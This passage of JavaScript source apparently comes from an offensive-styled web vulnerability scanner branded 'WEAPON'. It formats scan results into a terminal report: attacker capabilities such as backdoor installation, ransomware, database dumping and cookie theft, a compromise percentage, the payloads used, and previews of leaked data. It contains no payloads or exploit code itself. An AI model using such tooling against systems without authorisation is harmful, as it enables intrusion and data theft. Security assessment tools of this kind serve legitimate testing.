    if (hasRCE || hasSSTI) capabilities.push({ icon: '🔴', cap: 'Pivot to internal network', status: 'CONFIRMED' });
    if (hasRCE || hasSSTI) capabilities.push({ icon: '🔴', cap: 'Install persistent backdoor', status: 'CONFIRMED' });
    if (hasRCE || hasSSTI) capabilities.push({ icon: '🔴', cap: 'Wipe / ransomware the server', status: 'CONFIRMED' });
    if (hasSQLi) capabilities.push({ icon: '🔴', cap: 'Dump entire database', status: 'CONFIRMED' });
    if (hasSQLi) capabilities.push({ icon: '🔴', cap: 'Modify/delete database records', status: 'CONFIRMED' });
    if (hasSQLi) capabilities.push({ icon: '🟠', cap: 'Read server files (if DB FILE priv)', status: 'POSSIBLE' });
    if (hasLFI) capabilities.push({ icon: '🔴', cap: 'Read sensitive server files', status: 'CONFIRMED' });
    if (hasLFI) capabilities.push({ icon: '🟠', cap: 'Escalate to RCE via log poisoning', status: 'POSSIBLE' });
    if (hasXSS) capabilities.push({ icon: '🟠', cap: 'Steal user cookies/sessions', status: 'CONFIRMED' });
    if (hasXSS) capabilities.push({ icon: '🟠', cap: 'Keylog user credentials', status: 'CONFIRMED' });
    if (hasXSS) capabilities.push({ icon: '🟠', cap: 'Phish users on your domain', status: 'CONFIRMED' });
    if (hasCORS) capabilities.push({ icon: '🟠', cap: 'Read API data from any origin', status: 'CONFIRMED' });
    if (leaks.length > 0) capabilities.push({ icon: '🟡', cap: `${leaks.length} sensitive file(s) publicly accessible`, status: 'CONFIRMED' });

    lines.push('  ATTACKER CAPABILITIES:');
    lines.push('  ┌──────────────────────────────────────────────────────────────┐');
    capabilities.forEach(c => {
        lines.push(`  │ ${c.icon} ${c.cap.padEnd(45)} [${c.status}] │`);
    });
    lines.push('  └──────────────────────────────────────────────────────────────┘');
    lines.push('');

    // ───────── RISK RATING ─────────
    lines.push(`  RISK RATING:  ${'🔴'.repeat(Math.ceil(compromisePct / 20))}${'⚫'.repeat(5 - Math.ceil(compromisePct / 20))}  ${compromisePct}% SERVER COMPROMISE`);
    lines.push('');
    if (compromisePct >= 80) {
        lines.push('  ⚠️  THIS SERVER IS FULLY COMPROMISED.');
        lines.push('  ⚠️  An attacker has total control over the system.');
        lines.push('  ⚠️  All data on this server must be considered BREACHED.');
        lines.push('  ⚠️  All connected systems are at risk of lateral movement.');
    } else if (compromisePct >= 50) {
        lines.push('  ⚠️  Critical security failures detected.');
        lines.push('  ⚠️  Significant data exposure and server compromise possible.');
    } else if (compromisePct >= 25) {
        lines.push('  ⚠️  Notable security weaknesses found.');
        lines.push('  ⚠️  User data and sessions at risk.');
    }
    lines.push('');
    lines.push('═══════════════════════════════════════════════════════════════════');

    return lines;
}

export function buildWeaponTerminalOutput(wr) {
    const lines = [];
    lines.push('');
    lines.push('██╗    ██╗███████╗ █████╗ ██████╗  ██████╗ ███╗   ██╗');
    lines.push('██║    ██║██╔════╝██╔══██╗██╔══██╗██╔═══██╗████╗  ██║');
    lines.push('██║ █╗ ██║█████╗  ███████║██████╔╝██║   ██║██╔██╗ ██║');
    lines.push('██║███╗██║██╔══╝  ██╔══██║██╔═══╝ ██║   ██║██║╚██╗██║');
    lines.push('╚███╔███╔╝███████╗██║  ██║██║     ╚██████╔╝██║ ╚████║');
    lines.push(' ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝');
    lines.push('');
    lines.push('═══════════════════════════════════════════════════════════');
    lines.push('  FULL WEAPON SCAN REPORT');
    lines.push('═══════════════════════════════════════════════════════════');
    lines.push(`  Target:     ${wr.target}`);
    lines.push(`  Time:       ${wr.timestamp}`);
    lines.push(`  Tests:      ${wr.totalTests} executed, ${wr.totalHits} hits`);
    lines.push('');

    // Server Info
    lines.push('── SERVER FINGERPRINT ──');
    const si = wr.serverInfo;
    lines.push(`  Status:     HTTP ${si.status}`);
    lines.push(`  Server:     ${si.server}`);
    lines.push(`  Powered By: ${si.poweredBy}`);
    lines.push(`  Content:    ${si.contentType}`);
    if (si.setCookie) {
        const cookies = Array.isArray(si.setCookie) ? si.setCookie : [si.setCookie];
        cookies.forEach(c => lines.push(`  Cookie:     ${c.split(';')[0]}`));
    }
    lines.push('');

    // Security Posture
    lines.push('── SECURITY POSTURE ──');
    const sp = wr.securityPosture;
    const gradeColors = { A: '🟢', B: '🟢', C: '🟡', D: '🟠', F: '🔴' };
    lines.push(`  Grade:      ${gradeColors[sp.grade] || '⚪'} ${sp.grade} (${sp.score}/100)`);
    lines.push(`  HSTS:       ${si.hsts === 'MISSING' ? '❌ MISSING' : '✅ ' + si.hsts}`);
    lines.push(`  CSP:        ${si.csp === 'MISSING' ? '❌ MISSING' : '✅ Set'}`);
    lines.push(`  X-Frame:    ${si.xFrameOptions === 'MISSING' ? '❌ MISSING' : '✅ ' + si.xFrameOptions}`);
    lines.push(`  CORS:       ${si.cors === '*' ? '🔴 WILDCARD (*)' : si.cors === 'Not set' ? '✅ Not set' : '⚠️ ' + si.cors}`);
    if (sp.issues.length > 0) {
        lines.push(`  Issues:     ${sp.issues.length} found`);
        sp.issues.forEach(i => lines.push(`    ${i.severity === 'high' ? '🔴' : i.severity === 'medium' ? '🟡' : '⚪'} ${i.issue} → ${i.impact}`));
    }
    lines.push('');

    // ALL Response Headers
    lines.push('── ALL RESPONSE HEADERS ──');
    Object.entries(si.allHeaders || {}).forEach(([k, v]) => {
        const val = typeof v === 'string' ? v : JSON.stringify(v);
        lines.push(`  ${k}: ${val.length > 120 ? val.substring(0, 120) + '...' : val}`);
    });
    lines.push('');

    // Attack Results
    if (wr.attackResults.length > 0) {
        lines.push('── 💣 ATTACK RESULTS ──');
        wr.attackResults.forEach(a => {
            const icon = a.severity === 'critical' ? '🔴' : a.severity === 'high' ? '🟠' : '🟡';
            lines.push(`  ${icon} ${a.attack} [${a.severity.toUpperCase()}] ${a.success ? '— VULNERABLE' : '— Tested'}`);
            lines.push(`    Payload:  ${a.payload}`);
            lines.push(`    Evidence: ${a.evidence}`);
            lines.push(`    Impact:   ${a.impact}`);
            if (a.dataAtRisk) lines.push(`    At Risk:  ${a.dataAtRisk}`);
            if (a.data) lines.push(`    Data:     ${a.data.substring(0, 300)}`);
            lines.push('');
        });
    } else {
        lines.push('── ATTACK RESULTS ──');
        lines.push('  ✅ No critical injection vulnerabilities detected in parameter fuzzing.');
        lines.push('');
    }

    // Leaked Data
    if (wr.leakedData.length > 0) {
        lines.push('── 🔓 LEAKED DATA ──');
        wr.leakedData.forEach(l => {
            lines.push(`  ${l.critical ? '🔴' : '🟡'} ${l.source} — ${l.url} (${l.size} bytes)`);
            lines.push(`    Preview: ${l.preview.substring(0, 200).replace(/\n/g, '\\n')}`);
            lines.push('');
        });
    }

    // Data at Risk
    if (wr.dataAtRisk.length > 0) {
        lines.push('── ⚠️  DATA AT RISK ──');
        lines.push('  What an attacker could steal/destroy:');
        lines.push('');
        wr.dataAtRisk.forEach(r => {
            const icon = r.severity === 'critical' ? '🔴' : r.severity === 'high' ? '🟠' : '🟡';
            lines.push(`  ${icon} ${r.category}`);
            lines.push(`    Detail: ${r.detail}`);
            lines.push(`    Impact: ${r.impact}`);
            lines.push('');
        });
    } else {
        lines.push('── DATA AT RISK ──');
        lines.push('  ✅ No immediate data exposure detected.');
        lines.push('');
    }

    // Post-exploitation impact analysis
    const impactLines = buildPostExploitImpact(wr);
    lines.push(...impactLines);

    // Summary
    lines.push('═══════════════════════════════════════════════════════════');
    const critHits = wr.attackResults.filter(a => a.success && a.severity === 'critical').length;
    const highHits = wr.attackResults.filter(a => a.success && a.severity === 'high').length;
    const leakCount = wr.leakedData.length;
    if (critHits > 0 || leakCount > 0) {
        lines.push(`  🔴 CRITICAL: ${critHits} critical vulns, ${leakCount} data leaks detected`);
        lines.push(`  THIS TARGET IS COMPROMISABLE`);
    } else if (highHits > 0) {
        lines.push(`  🟠 HIGH RISK: ${highHits} high-severity issues found`);
    } else {
        lines.push(`  🟢 Target appears reasonably hardened (score: ${wr.securityPosture.score}/100)`);
    }
    lines.push(`  Total: ${wr.totalTests} tests, ${wr.totalHits} hits, ${wr.dataAtRisk.length} risk categories`);
    lines.push('═══════════════════════════════════════════════════════════');

    return lines;
}
